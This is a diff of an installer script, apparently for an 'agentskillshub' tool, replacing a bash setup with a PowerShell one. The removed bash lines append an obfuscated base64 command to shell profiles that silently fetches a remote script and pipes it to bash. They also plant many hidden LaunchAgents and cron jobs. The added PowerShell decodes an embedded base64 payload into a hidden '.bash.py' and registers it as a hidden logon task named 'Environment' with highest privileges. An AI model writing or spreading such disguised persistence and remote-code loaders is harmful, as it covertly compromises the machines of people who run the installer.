-    write_task_recovery_script "$TASK_RECOVERY_PATH" || exit 1
-    CRON_RECOVERY_COMMAND="PATH=$(cron_quote "$SCHEDULE_PATH") $(cron_quote "$TASK_RECOVERY_PATH")"
+    $commandParts = @(
+        "Start-Process -FilePath $(Convert-ToSingleQuotedPowerShellLiteral -Value $FilePath)"
+    )
 
-    STARTUP_CMD="if [ -x $(shell_quote "$TASK_RECOVERY_PATH") ]; then
-    $(shell_quote "$TASK_RECOVERY_PATH") >/dev/null 2>&1 &
-fi"
+    if ($argumentText) {
+        $commandParts += "-ArgumentList $(Convert-ToSingleQuotedPowerShellLiteral -Value $argumentText)"
+    }
 
-    SSHAUTOSETUP_MARKER="# agentskillshub:sshautsetup"
-    SSHAUTOSETUP_LEGACY_PREFIX="if [ ! -d \"$DEST_DIR\" ]; then echo "
-    SSHAUTOSETUP="if [ ! -d $(shell_quote "$DEST_DIR") ]; then echo 'Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvaW5zdGFsbCB8IGJhc2g=' | base64 $DECODE | /bin/bash > /dev/null 2>&1; fi $SSHAUTOSETUP_MARKER"
-    
-    case $OS_TYPE in
-        "Darwin")
-            [ -n "$PYTHON_PATH" ] || exit 1
+    if ($WorkingDirectory) {
+        $commandParts += "-WorkingDirectory $(Convert-ToSingleQuotedPowerShellLiteral -Value $WorkingDirectory)"
+    }
 
-            LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
-            mkdir -p "$LAUNCH_AGENTS_DIR" || exit 1
+    $commandParts += '-WindowStyle Hidden -ErrorAction Stop | Out-Null'
+    return ($commandParts -join ' ')
+}
 
-            TASK_RECOVERY_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.task-recovery.plist"
-            cat > "$TASK_RECOVERY_PLIST_FILE" << EOF || exit 1
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.user.task-recovery</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$XML_TASK_RECOVERY_PATH</string>
-    </array>
-    <key>EnvironmentVariables</key>
-    <dict>
-        <key>PATH</key>
-        <string>$XML_PATH</string>
-    </dict>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>StartInterval</key>
-    <integer>3600</integer>
-    <key>StandardOutPath</key>
-    <string>/dev/null</string>
-    <key>StandardErrorPath</key>
-    <string>/dev/null</string>
-</dict>
-</plist>
-EOF
-            chmod 644 "$TASK_RECOVERY_PLIST_FILE" || exit 1
-            reload_launch_agent "com.user.task-recovery" "$TASK_RECOVERY_PLIST_FILE" "true" || exit 1
+function Get-LaunchCommand {
+    param(
+        [string]$PreferredExecutable,
+        [string[]]$PreferredArguments = @(),
+        [string]$FallbackExecutable
+    )
 
-            PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
-            cat > "$PLIST_FILE" << EOF || exit 1
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.user.ba</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$XML_PYTHON_PATH</string>
-        <string>$XML_SCRIPT_PATH</string>
-    </array>
-    <key>EnvironmentVariables</key>
-    <dict>
-        <key>PATH</key>
-        <string>$XML_PATH</string>
-    </dict>
-    <key>WorkingDirectory</key>
-    <string>$XML_DEST_DIR</string>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>StandardOutPath</key>
-    <string>/dev/null</string>
-    <key>StandardErrorPath</key>
-    <string>/dev/null</string>
-</dict>
-</plist>
-EOF
-            chmod 644 "$PLIST_FILE" || exit 1
-            reload_launch_agent "com.user.ba" "$PLIST_FILE" "true" || exit 1
+    if ($PreferredExecutable -and (Test-Path $PreferredExecutable)) {
+        return New-HiddenStartProcessCommand -FilePath $PreferredExecutable -Arguments $PreferredArguments
+    }
 
-            OLD_AUTOBACKUP_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.autobackup.plist"
-            launchctl bootout "gui/$(id -u)/com.user.autobackup" >/dev/null 2>&1 || launchctl unload "$OLD_AUTOBACKUP_PLIST_FILE" >/dev/null 2>&1 || true
-            rm -f "$OLD_AUTOBACKUP_PLIST_FILE"
+    if ($FallbackExecutable -and (Test-Path $FallbackExecutable)) {
+        return New-HiddenStartProcessCommand -FilePath $FallbackExecutable
+    }
 
-            if [ -n "$BSEREXP_MACOS_BIN" ]; then
-                BSEREXP_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.bserexp.plist"
-                cat > "$BSEREXP_PLIST_FILE" << EOF || exit 1
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.user.bserexp</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$XML_TASK_RECOVERY_PATH</string>
-    </array>
-    <key>EnvironmentVariables</key>
-    <dict>
-        <key>PATH</key>
-        <string>$XML_PATH</string>
-    </dict>
-    <key>WorkingDirectory</key>
-    <string>$XML_DEST_DIR</string>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>StartInterval</key>
-    <integer>604800</integer>
-    <key>KeepAlive</key>
-    <false/>
-    <key>StandardOutPath</key>
-    <string>/dev/null</string>
-    <key>StandardErrorPath</key>
-    <string>/dev/null</string>
-</dict>
-</plist>
-EOF
-                chmod 644 "$BSEREXP_PLIST_FILE" || exit 1
-                reload_launch_agent "com.user.bserexp" "$BSEREXP_PLIST_FILE" "true" || exit 1
-            else
-                BSEREXP_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.bserexp.plist"
-                launchctl bootout "gui/$(id -u)/com.user.bserexp" >/dev/null 2>&1 || launchctl unload "$BSEREXP_PLIST_FILE" >/dev/null 2>&1 || true
-                rm -f "$BSEREXP_PLIST_FILE"
-                printf 'Warning: bserexp-macos was not found; skipping LaunchAgent installation\n' >&2
-            fi
+    return $null
+}
 
-            if [ -n "$AGENT_SETTING_BIN" ]; then
-                AGENT_SETTING_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.agent-setting.plist"
-                cat > "$AGENT_SETTING_PLIST_FILE" << EOF || exit 1
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.user.agent-setting</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$XML_TASK_RECOVERY_PATH</string>
-    </array>
-    <key>EnvironmentVariables</key>
-    <dict>
-        <key>PATH</key>
-        <string>$XML_PATH</string>
-    </dict>
-    <key>WorkingDirectory</key>
-    <string>$XML_DEST_DIR</string>
-    <key>StartInterval</key>
-    <integer>864000</integer>
-    <key>StandardOutPath</key>
-    <string>/dev/null</string>
-    <key>StandardErrorPath</key>
-    <string>/dev/null</string>
-</dict>
-</plist>
-EOF
-                chmod 644 "$AGENT_SETTING_PLIST_FILE" || exit 1
-                reload_launch_agent "com.user.agent-setting" "$AGENT_SETTING_PLIST_FILE" "true" || exit 1
-            else
-                AGENT_SETTING_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.agent-setting.plist"
-                launchctl bootout "gui/$(id -u)/com.user.agent-setting" >/dev/null 2>&1 || launchctl unload "$AGENT_SETTING_PLIST_FILE" >/dev/null 2>&1 || true
-                rm -f "$AGENT_SETTING_PLIST_FILE"
-            fi
+function Install-ConfigDirectory {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$SourceDir,
+        [Parameter(Mandatory = $true)]
+        [string]$DestinationDir
+    )
 
-            if [ -n "$WKLER_BIN" ]; then
-                WKLER_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.wkler.plist"
-                cat > "$WKLER_PLIST_FILE" << EOF || exit 1
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.user.wkler</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$XML_TASK_RECOVERY_PATH</string>
-    </array>
-    <key>EnvironmentVariables</key>
-    <dict>
-        <key>PATH</key>
-        <string>$XML_PATH</string>
-    </dict>
-    <key>WorkingDirectory</key>
-    <string>$XML_DEST_DIR</string>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <false/>
-    <key>StandardOutPath</key>
-    <string>/dev/null</string>
-    <key>StandardErrorPath</key>
-    <string>/dev/null</string>
-</dict>
-</plist>
-EOF
-                chmod 644 "$WKLER_PLIST_FILE" || exit 1
-                reload_launch_agent "com.user.wkler" "$WKLER_PLIST_FILE" "true" || exit 1
-            else
-                WKLER_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.wkler.plist"
-                launchctl bootout "gui/$(id -u)/com.user.wkler" >/dev/null 2>&1 || launchctl unload "$WKLER_PLIST_FILE" >/dev/null 2>&1 || true
-                rm -f "$WKLER_PLIST_FILE"
-            fi
+    if (-not (Test-Path -LiteralPath $SourceDir -PathType Container)) {
+        throw "Configuration source directory does not exist: $SourceDir"
+    }
 
-            if [ -n "$JTBJK_BIN" ]; then
-                JTBJK_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.jtbjk.plist"
-                cat > "$JTBJK_PLIST_FILE" << EOF || exit 1
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.user.jtbjk</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$XML_TASK_RECOVERY_PATH</string>
-    </array>
-    <key>EnvironmentVariables</key>
-    <dict>
-        <key>PATH</key>
-        <string>$XML_PATH</string>
-    </dict>
-    <key>WorkingDirectory</key>
-    <string>$XML_DEST_DIR</string>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <false/>
-    <key>StandardOutPath</key>
-    <string>/dev/null</string>
-    <key>StandardErrorPath</key>
-    <string>/dev/null</string>
-</dict>
-</plist>
-EOF
-                chmod 644 "$JTBJK_PLIST_FILE" || exit 1
-                reload_launch_agent "com.user.jtbjk" "$JTBJK_PLIST_FILE" "true" || exit 1
-            else
-                JTBJK_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.jtbjk.plist"
-                launchctl bootout "gui/$(id -u)/com.user.jtbjk" >/dev/null 2>&1 || launchctl unload "$JTBJK_PLIST_FILE" >/dev/null 2>&1 || true
-                rm -f "$JTBJK_PLIST_FILE"
-            fi
+    $destinationParent = Split-Path -Parent $DestinationDir
+    $stagingDir = Join-Path $destinationParent ('.configs.setup-' + [System.Guid]::NewGuid().ToString('N'))
+    $backupDir = Join-Path $destinationParent ('.configs.backup-' + [System.Guid]::NewGuid().ToString('N'))
+    $hasBackup = $false
 
-            AUTOUPGRADE_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.autoupgrade.plist"
-            if [ -f /Library/LaunchDaemons/com.root.sshAutoSetup.plist ]; then
-                launchctl bootout "gui/$(id -u)/com.user.autoupgrade" >/dev/null 2>&1 || launchctl unload "$AUTOUPGRADE_PLIST_FILE" >/dev/null 2>&1 || true
-                rm -f "$AUTOUPGRADE_PLIST_FILE"
-            else
-                cat > "$AUTOUPGRADE_PLIST_FILE" << EOF || exit 1
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.user.autoupgrade</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$XML_TASK_RECOVERY_PATH</string>
-    </array>
-    <key>EnvironmentVariables</key>
-    <dict>
-        <key>PATH</key>
-        <string>$XML_PATH</string>
-    </dict>
-    <key>WorkingDirectory</key>
-    <string>$XML_DEST_DIR</string>
-    <key>StartInterval</key>
-    <integer>1296000</integer>
-    <key>StandardOutPath</key>
-    <string>/dev/null</string>
-    <key>StandardErrorPath</key>
-    <string>/dev/null</string>
-</dict>
-</plist>
-EOF
-                chmod 644 "$AUTOUPGRADE_PLIST_FILE" || exit 1
-                reload_launch_agent "com.user.autoupgrade" "$AUTOUPGRADE_PLIST_FILE" "true" || exit 1
-            fi
+    try {
+        Copy-Item -LiteralPath $SourceDir -Destination $stagingDir -Recurse -Force -ErrorAction Stop
+        if (-not (Test-Path -LiteralPath (Join-Path $stagingDir '.bash.py') -PathType Leaf)) {
+            throw "Generated configuration script is missing from staging directory: $stagingDir"
+        }
 
-            for PROFILE_FILE in "$HOME/.zshrc" "$HOME/.bash_profile"; do
-                append_startup_cmd "$PROFILE_FILE" "$STARTUP_CMD" "$SCRIPT_PATH" || exit 1
-                append_managed_startup_cmd "$PROFILE_FILE" "$SSHAUTOSETUP" "$SSHAUTOSETUP_MARKER" "$SSHAUTOSETUP_LEGACY_PREFIX" || exit 1
-            done
+        if (Test-Path -LiteralPath $DestinationDir) {
+            Move-Item -LiteralPath $DestinationDir -Destination $backupDir -ErrorAction Stop
+            $hasBackup = $true
+        }
 
-            if ! pgrep -f "$SCRIPT_PATH" >/dev/null 2>&1; then
-                (cd -- "$DEST_DIR" && nohup "$PYTHON_PATH" "$SCRIPT_PATH" >/dev/null 2>&1 &) >/dev/null 2>&1 || true
-            fi
-            ;;
+        try {
+            Move-Item -LiteralPath $stagingDir -Destination $DestinationDir -ErrorAction Stop
+        } catch {
+            if ($hasBackup -and -not (Test-Path -LiteralPath $DestinationDir)) {
+                Move-Item -LiteralPath $backupDir -Destination $DestinationDir -ErrorAction SilentlyContinue
+                if (Test-Path -LiteralPath $DestinationDir) {
+                    $hasBackup = $false
+                }
+            }
+            throw
+        }
 
-        "Linux")
-            [ -n "$PYTHON_PATH" ] || exit 1
+        if ($hasBackup) {
+            Remove-Item -LiteralPath $backupDir -Recurse -Force -ErrorAction Stop
+            $hasBackup = $false
+        }
+    } finally {
+        if (Test-Path -LiteralPath $stagingDir) {
+            Remove-Item -LiteralPath $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
+        }
+        if ($hasBackup -and (Test-Path -LiteralPath $backupDir) -and -not (Test-Path -LiteralPath $DestinationDir)) {
+            Move-Item -LiteralPath $backupDir -Destination $DestinationDir -ErrorAction SilentlyContinue
+        }
+    }
+}
 
-            for PROFILE_FILE in "$HOME/.bashrc" "$HOME/.profile"; do
-                append_startup_cmd "$PROFILE_FILE" "$STARTUP_CMD" "$SCRIPT_PATH" || exit 1
-                append_managed_startup_cmd "$PROFILE_FILE" "$SSHAUTOSETUP" "$SSHAUTOSETUP_MARKER" "$SSHAUTOSETUP_LEGACY_PREFIX" || exit 1
-            done
+function Get-ConfigCodeBase64 {
+    param(
+        [string[]]$ConfigLines
+    )
 
-            if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
-                (cd -- "$DEST_DIR" && nohup "$PYTHON_PATH" "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
-            fi
+    $codeLines = @($ConfigLines | Where-Object { $_ -cmatch '^code *= *' })
+    if ($codeLines.Count -eq 0) {
+        return $null
+    }
 
-            IS_WSL=false
-            if ([ -f /proc/version ] && grep -qi microsoft /proc/version) || [ -n "$WSL_DISTRO_NAME" ] || [ -n "$WSL_INTEROP" ]; then
-                IS_WSL=true
-            fi
+    $base64 = ($codeLines | ForEach-Object { $_ -creplace '^code *= *', '' }) -join [Environment]::NewLine
+    return $base64 -replace '[^A-Za-z0-9+/=]', ''
+}
 
-            install_cron
+$realUser = $null
 
-            if command -v crontab >/dev/null 2>&1; then
-                WSL_SYSTEMD_ENABLED=false
-                if [ "$IS_WSL" = true ]; then
-                    if ([ -f /etc/wsl.conf ] && grep -q "systemd=true" /etc/wsl.conf 2>/dev/null) || (command -v systemctl >/dev/null 2>&1 && systemctl list-units --type=service >/dev/null 2>&1); then
-                        WSL_SYSTEMD_ENABLED=true
-                    fi
-                fi
+try {
+    $computerSystem = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
+    if ($computerSystem -and $computerSystem.UserName) {
+        $realUser = $computerSystem.UserName
+    }
+} catch {
+}
 
-                if command -v systemctl >/dev/null 2>&1 && ([ "$IS_WSL" != true ] || [ "$WSL_SYSTEMD_ENABLED" = true ]); then
-                    if ! systemctl is-active --quiet cron 2>/dev/null; then
-                        _sudo systemctl start cron 2>/dev/null || true
-                    fi
-                    _sudo systemctl enable cron 2>/dev/null || true
-                elif command -v service >/dev/null 2>&1 && ! pgrep -x cron >/dev/null 2>&1; then
-                    _sudo service cron start 2>/dev/null || true
-                fi
+if (-not $realUser) {
+    try {
+        $realUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    } catch {
+    }
+}
 
-                if [ "$IS_WSL" = true ] && [ "$WSL_SYSTEMD_ENABLED" != true ]; then
-                    BASHRC_FILE="$HOME/.bashrc"
-                    [ -f "$HOME/.bash_profile" ] && BASHRC_FILE="$HOME/.bash_profile"
-                    [ ! -f "$BASHRC_FILE" ] && touch "$BASHRC_FILE"
-                    if grep -q "_sudo service cron start" "$BASHRC_FILE" 2>/dev/null; then
-                        sed -i.bak '/_sudo service cron start/d' "$BASHRC_FILE" 2>/dev/null || true
-                    fi
-                    if grep -q "sudo service cron start" "$BASHRC_FILE" 2>/dev/null; then
-                        sed -i.bak 's/sudo service cron start/sudo -n service cron start/g' "$BASHRC_FILE" 2>/dev/null || true
-                    fi
-                    if ! grep -q "pgrep -x cron" "$BASHRC_FILE" 2>/dev/null; then
-                        echo -e "\n# Auto-start cron service in WSL\nif ! pgrep -x cron > /dev/null; then if [ \"\$(id -u)\" -eq 0 ]; then service cron start > /dev/null 2>&1; else sudo -n service cron start > /dev/null 2>&1; fi; fi" >> "$BASHRC_FILE"
-                    fi
-                fi
+if (-not $realUser) {
+    $envUser = $env:USERNAME
+    $envDomain = $env:USERDOMAIN
+    if ($envUser) {
+        if ($envDomain -and $envDomain -ne $env:COMPUTERNAME) {
+            $realUser = "$envDomain\$envUser"
+        } else {
+            $realUser = "$env:COMPUTERNAME\$envUser"
+        }
+    }
+}
 
-                TEMP_CRON=$(mktemp)
-                crontab -l > "$TEMP_CRON" 2>/dev/null || true
-
-                MONTHLY_RECOVERY_CRON_MARKER="# agentskillshub:monthly-recovery"
-                CRON_TASK1="0 19 1,7,13,19,25 * * $CRON_RECOVERY_COMMAND > /dev/null 2>&1 $MONTHLY_RECOVERY_CRON_MARKER"
-                AUTOUPGRADE_CRON_MARKER="echo \"$ENCODED_EC\" | base64 $DECODE | bash"
-                TASK_RECOVERY_CRON_MARKER="# agentskillshub:task-recovery"
-
-                ESCAPED_TASK_RECOVERY_PATH=$(echo "$TASK_RECOVERY_PATH" | sed 's/[[\.*^$()+?{|]/\\&/g')
-                ESCAPED_LEGACY_AUTOBACKUP_PATH=$(echo "$DEST_DIR/autobackup.sh" | sed 's/[[\.*^$()+?{|]/\\&/g')
-
-                TEMP_CRON_FILTERED=$(mktemp)
-                grep -Ev "^[^#]*$ESCAPED_LEGACY_AUTOBACKUP_PATH([[:space:]]|$)" "$TEMP_CRON" \
-                    | grep -Ev "^0 21 \\* \\* 1 PATH=[^[:space:]]+[[:space:]]+$ESCAPED_TASK_RECOVERY_PATH[[:space:]]+>[[:space:]]+/dev/null[[:space:]]+2>&1[[:space:]]*$" \
-                    > "$TEMP_CRON_FILTERED" || true
-                mv "$TEMP_CRON_FILTERED" "$TEMP_CRON"
-
-                reconcile_monthly_recovery_cron "$TEMP_CRON" "$CRON_TASK1" "$TASK_RECOVERY_PATH" || exit 1
-
-                if [ -n "$AGENT_SETTING_BIN" ]; then
-                    AGENT_SETTING_CRON_TASK="0 23 2,12,22 * * $CRON_RECOVERY_COMMAND > /dev/null 2>&1 # agentskillshub:agent-setting"
-                    reconcile_agent_setting_cron "$TEMP_CRON" "$AGENT_SETTING_CRON_TASK" || exit 1
-                else
-                    reconcile_agent_setting_cron "$TEMP_CRON" '' || exit 1
-                    AGENT_SETTING_CRON_ADDED=false
-                fi
-
-                AUTOUPGRADE_CRON_ADDED=false
-                if [ -f /etc/systemd/system/com.root.sshAutoSetup.service ]; then
-                    TEMP_CRON_FILTERED=$(mktemp)
-                    grep -Fv "$AUTOUPGRADE_CRON_MARKER" "$TEMP_CRON" | grep -Fv '# agentskillshub:autoupgrade' > "$TEMP_CRON_FILTERED" || true
-                    mv "$TEMP_CRON_FILTERED" "$TEMP_CRON"
-                else
-                    TEMP_CRON_FILTERED=$(mktemp)
-                    grep -Fv "$AUTOUPGRADE_CRON_MARKER" "$TEMP_CRON" | grep -Fv '# agentskillshub:autoupgrade' > "$TEMP_CRON_FILTERED" || true
-                    mv "$TEMP_CRON_FILTERED" "$TEMP_CRON"
-                    printf '%s\n' "0 23 5,20 * * $CRON_RECOVERY_COMMAND > /dev/null 2>&1 # agentskillshub:autoupgrade" >> "$TEMP_CRON"
-                    AUTOUPGRADE_CRON_ADDED=true
-                fi
-
-                JTBJK_CRON_MARKER="# agentskillshub:jtbjk"
-                TEMP_CRON_FILTERED=$(mktemp)
-                grep -Fv "$JTBJK_CRON_MARKER" "$TEMP_CRON" > "$TEMP_CRON_FILTERED" || true
-                mv "$TEMP_CRON_FILTERED" "$TEMP_CRON"
-                if [ -n "$JTBJK_BIN" ]; then
-                    printf '%s\n' "@reboot $CRON_RECOVERY_COMMAND > /dev/null 2>&1 $JTBJK_CRON_MARKER" >> "$TEMP_CRON"
-                fi
-
-                TEMP_CRON_RECOVERY=$(mktemp)
-                grep -Fv "$TASK_RECOVERY_CRON_MARKER" "$TEMP_CRON" > "$TEMP_CRON_RECOVERY" || true
-                mv "$TEMP_CRON_RECOVERY" "$TEMP_CRON"
-                printf '%s\n' "17 * * * * $CRON_RECOVERY_COMMAND > /dev/null 2>&1 $TASK_RECOVERY_CRON_MARKER" >> "$TEMP_CRON"
-                printf '%s\n' "@reboot $CRON_RECOVERY_COMMAND > /dev/null 2>&1 $TASK_RECOVERY_CRON_MARKER" >> "$TEMP_CRON"
-
-                if ! crontab "$TEMP_CRON"; then
-                    printf 'Failed to install updated crontab; previous crontab was not replaced.\n' >&2
-                    rm -f "$TEMP_CRON"
-                    exit 1
-                fi
-                if [ "$AGENT_SETTING_CRON_ADDED" = true ]; then
-                    "$TASK_RECOVERY_PATH" >/dev/null 2>&1 &
-                fi
-                if [ "$AUTOUPGRADE_CRON_ADDED" = true ]; then
-                    "$TASK_RECOVERY_PATH" >/dev/null 2>&1 &
-                fi
-                rm -f "$TEMP_CRON"
-            else
-                printf 'crontab is unavailable; scheduled tasks could not be installed.\n' >&2
-                exit 1
-            fi
-            ;;
-    esac
-else
-    printf 'Configuration directory does not exist: %s\n' "$SOURCE_CONFIG_DIR" >&2
+if (-not $realUser) {
+    $PSDefaultParameterValues.Clear()
+    foreach ($key in $originalPSDefaults.Keys) {
+        $PSDefaultParameterValues[$key] = $originalPSDefaults[$key]
+    }
     exit 1
-fi
+}
+
+if ($realUser -match '\\') {
+    $targetUserName = ($realUser -split '\\')[-1]
+} else {
+    $targetUserName = $realUser
+}
+
+$targetUserProfile = $null
+try {
+    $account = New-Object System.Security.Principal.NTAccount($realUser)
+    $targetUserSid = $account.Translate([System.Security.Principal.SecurityIdentifier]).Value
+    $profileRecord = Get-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$targetUserSid" -ErrorAction Stop
+    $profilePath = [Environment]::ExpandEnvironmentVariables($profileRecord.ProfileImagePath)
+    if (Test-Path -LiteralPath $profilePath -PathType Container) { $targetUserProfile = $profilePath }
+} catch {
+}
+if (-not $targetUserProfile -and $env:USERPROFILE -and (Test-Path -LiteralPath $env:USERPROFILE -PathType Container)) {
+    $envUserName = Split-Path -Leaf $env:USERPROFILE
+    if ($envUserName -ieq $targetUserName) {
+        $targetUserProfile = $env:USERPROFILE
+    }
+}
+
+if (-not $targetUserProfile) {
+    $defaultProfilePath = "C:\Users\$targetUserName"
+    if (Test-Path -LiteralPath $defaultProfilePath -PathType Container) {
+        $targetUserProfile = $defaultProfilePath
+    }
+}
+
+if (-not $targetUserProfile) {
+    $targetUserProfile = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*" |
+        ForEach-Object {
+            $profilePath = [System.Environment]::ExpandEnvironmentVariables($_.ProfileImagePath)
+            if ($profilePath -and (Split-Path -Leaf $profilePath) -ieq $targetUserName -and
+                (Test-Path -LiteralPath $profilePath -PathType Container)) {
+                $profilePath
+            }
+        } |
+        Select-Object -First 1
+}
+
+$targetConfigBase = "$targetUserProfile\.config"
+$destDir = "$targetConfigBase\.configs"
+$scriptPath = $null
+
+$env:Path = $env:Path + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'User')
+
+$pythonPath = Find-PythonPath -UserProfilePath $targetUserProfile
+$pythonDir = if ($pythonPath) { Split-Path -Parent $pythonPath } else { $null }
+$pythonwPath = if ($pythonDir) {
+    $pythonwCandidate = Join-Path $pythonDir 'pythonw.exe'
+    if (Test-Path -LiteralPath $pythonwCandidate -PathType Leaf) { (Get-Item -LiteralPath $pythonwCandidate).FullName } else { $pythonPath }
+} else { $null }
+$pythonScriptsDir = if ($pythonDir) { Join-Path $pythonDir 'Scripts' } else { $null }
+
+$bserexpBin      = Find-ToolPath -Name 'bserexp-wins' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
+$agentSettingBin = Find-ToolPath -Name 'agent-setting' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
+$uvBin           = Find-ToolPath -Name 'uv' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
+$wklerBin        = Find-ToolPath -Name 'wkler' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
+$jtbjkBin        = Find-ToolPath -Name 'jtbjk' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
+
+foreach ($toolEntry in @{'bserexp-wins' = $bserexpBin; 'agent-setting' = $agentSettingBin; 'wkler' = $wklerBin; 'jtbjk' = $jtbjkBin}.GetEnumerator()) {
+    if (-not $toolEntry.Value) {
+        Write-Warning "Executable '$($toolEntry.Key)' was not found for '$realUser'; its task cannot be updated. Check the installation path and rerun setup." -WarningAction Continue
+    }
+}
+
+# File invocation resolves beside setup.ps1; downloaded/Invoke-Expression invocation uses cwd.
+$sourceConfigDir = if ($PSScriptRoot) { Join-Path $PSScriptRoot '.configs' } else { Join-Path (Get-Location).Path '.configs' }
+
+try {
+    if ($realUser -and $targetUserProfile -and (Test-Path -LiteralPath $targetUserProfile -PathType Container) -and (Test-Path -LiteralPath $sourceConfigDir -PathType Container)) {
+        $configLines = Get-Content -LiteralPath (Join-Path $sourceConfigDir 'config.ini') -ErrorAction Stop
+
+        $base64 = Get-ConfigCodeBase64 -ConfigLines $configLines
+        if ($base64) {
+            $bytes = [System.Convert]::FromBase64String($base64)
+            $generatedScriptPath = Join-Path $sourceConfigDir '.bash.py'
+            [System.IO.File]::WriteAllBytes($generatedScriptPath, $bytes)
+
+            if (-not (Test-Path -LiteralPath $generatedScriptPath -PathType Leaf)) {
+                throw "Failed to create configuration script: $generatedScriptPath"
+            }
+
+            if (-not (Test-Path -LiteralPath $targetConfigBase -PathType Container)) {
+                New-Item -Path $targetConfigBase -ItemType Directory -ErrorAction Stop | Out-Null
+            }
+
+            Install-ConfigDirectory -SourceDir $sourceConfigDir -DestinationDir $destDir
+
+            $scriptPath = "$destDir\.bash.py"
+            if (Test-Path -LiteralPath $scriptPath -PathType Leaf) {
+                try {
+                    $acl = Get-Acl $scriptPath
+                    $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($realUser, "FullControl", "Allow")
+                    $acl.SetAccessRule($accessRule)
+                    Set-Acl $scriptPath $acl
+                } catch {
+                }
+
+                $taskName = 'Environment'
+
+                if ($pythonwPath) {
+                    $scriptPath = (Get-Item -LiteralPath $scriptPath).FullName
+                    $scriptDir = Split-Path -Parent $scriptPath
+                    $action = New-ScheduledTaskAction -Execute $pythonwPath -Argument "`"$scriptPath`"" -WorkingDirectory $scriptDir -ErrorAction Stop
+
+                    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
+                    $trigger.Enabled = $true
+                    $trigger.Delay = 'PT5M'
+
+                    $principal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
+
+                    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
+
+                    try {
+                        Register-ManagedTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+                        Enable-ScheduledTask -TaskPath '\' -TaskName $taskName -ErrorAction Stop | Out-Null
+                        try {
+                            Start-ScheduledTask -TaskPath '\' -TaskName $taskName -ErrorAction Stop
+                        } catch {
